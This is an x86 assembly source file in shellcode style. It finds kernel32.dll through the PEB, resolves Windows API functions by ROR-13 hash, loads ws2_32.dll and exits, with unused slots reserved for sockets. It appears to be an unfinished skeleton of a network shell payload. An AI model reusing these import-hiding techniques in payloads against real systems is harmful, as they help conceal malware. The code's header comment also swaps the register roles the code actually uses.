BITS 32

%define KERNEL32        ebp-0x04
%define WSOCK2          ebp-0x08
%define SSOCK           ebp-0x0C
%define CSOCK           ebp-0x10
%define SOCKADDR        ebp-0x26
%define WSADATA         ebp-0x3B

%define ExitProcess     0x73E2D87E
%define GetProcAddress  0x7C0DFCAA
%define LoadLibrary     0xEC0E4E8E


section code use32 class=code

;------------------------------------------------------------------------------
..start:
    push    ebp
    mov     ebp, esp    
    sub     esp, 0x3C
                
    xor     eax, eax                ; find base of kernel32.dll
    mov     eax, [fs:0x30]
    mov     eax, [eax+0x0c]
    mov     esi, [eax+0x1c]
    lodsd
    mov     eax, [eax+0x8]
    mov     [KERNEL32], eax    

    mov     eax, LoadLibrary
    mov     ebx, [KERNEL32]
    call    GetProcAddr
    
    xor     ebx, ebx                ; load ws2_32.dll into memory
    mov     bx, 0x3233
    push    ebx
    push    0x5f327377
    push    esp
    call    eax
    mov     [WSOCK2], eax

        
    mov     eax, ExitProcess       ; Terminate Process
    mov     ebx, [KERNEL32]     
    call    GetProcAddr             
    push    0x0
    call    eax        
    
    mov     esp, ebp
    pop     ebp           
    ret       

;------------------------------------------------------------------------------
;   eax = vma of module      
;   ebx = hash of function 
;------------------------------------------------------------------------------
GetProcAddr:
    pushad       

    mov     ebp, [esp+0x10]
    mov     eax, [ebp+0x3c]
    mov     edx, [ebp+eax+0x78]
    add     edx, ebp
    mov     ecx, [edx+0x18]
    mov     ebx, [edx+0x20]
    add     ebx, ebp
.find_function_loop:
    jecxz   .find_function_finished
    dec     ecx
    mov     esi, [ebx+ecx*4]
    add     esi, ebp
.compute_hash:
    xor     edi, edi
    xor     eax, eax
.compute_hash_again:
    lodsb
    test    al, al
    jz      .find_function_compare
    ror     edi, 0xd
    add     edi, eax
    jmp     .compute_hash_again
.find_function_compare:
    cmp     edi, [esp+0x1C]
    jnz     .find_function_loop
    mov     ebx, [edx+0x24]
    add     ebx, ebp
    mov      cx, [ebx+2*ecx]
    mov     ebx, [edx+0x1c]
    add     ebx, ebp
    mov     eax, [ebx+4*ecx]
    add     eax, ebp     
.find_function_finished:        
    mov     [esp+0x1C], eax

    popad      
    ret
    